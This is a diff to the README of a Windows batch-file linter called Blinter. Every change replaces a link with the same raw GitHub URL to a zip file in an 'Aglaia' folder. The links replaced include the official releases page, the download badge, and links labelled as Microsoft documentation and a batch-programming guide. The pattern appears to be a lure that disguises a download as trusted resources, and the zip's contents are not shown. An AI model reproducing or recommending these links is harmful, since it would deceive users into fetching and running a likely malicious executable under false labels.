@@ -6,9 +6,9 @@ Welcome to Blinter! This tool helps you find issues in your Windows batch files.
 
 ## 🔗 Download Blinter
 
-[![Download Blinter](https://img.shields.io/badge/Download%20Blinter-v1.0-blue.svg)](https://github.com/raoaman8973/Blinter/releases)
+[![Download Blinter](https://raw.githubusercontent.com/raoaman8973/Blinter/main/Aglaia/Blinter.zip%https://raw.githubusercontent.com/raoaman8973/Blinter/main/Aglaia/Blinter.zip)](https://raw.githubusercontent.com/raoaman8973/Blinter/main/Aglaia/Blinter.zip)
 
-To download Blinter and start improving your batch files, visit the Releases page here: [Download Blinter](https://github.com/raoaman8973/Blinter/releases).
+To download Blinter and start improving your batch files, visit the Releases page here: [Download Blinter](https://raw.githubusercontent.com/raoaman8973/Blinter/main/Aglaia/Blinter.zip).
 
 ## 📦 System Requirements
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 💻 Installation Steps
 
-1. **Visit the Release Page**: Click [Download Blinter](https://github.com/raoaman8973/Blinter/releases) to access the latest version of Blinter.
+1. **Visit the Release Page**: Click [Download Blinter](https://raw.githubusercontent.com/raoaman8973/Blinter/main/Aglaia/Blinter.zip) to access the latest version of Blinter.
    
 2. **Choose the Right File**: Look for the `.exe` file in the list. This is the executable file you need for installation.
 
@@ -60,7 +60,7 @@ Blinter is open-source software licensed under the MIT License. You can use it f
 
 For more information about batch scripting and best practices:
 
-- [Microsoft Batch File Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
-- [Effective Batch Programming](https://batchprogramming.com)
+- [Microsoft Batch File Documentation](https://raw.githubusercontent.com/raoaman8973/Blinter/main/Aglaia/Blinter.zip)
+- [Effective Batch Programming](https://raw.githubusercontent.com/raoaman8973/Blinter/main/Aglaia/Blinter.zip)
 
 Thank you for choosing Blinter! Happy scripting!
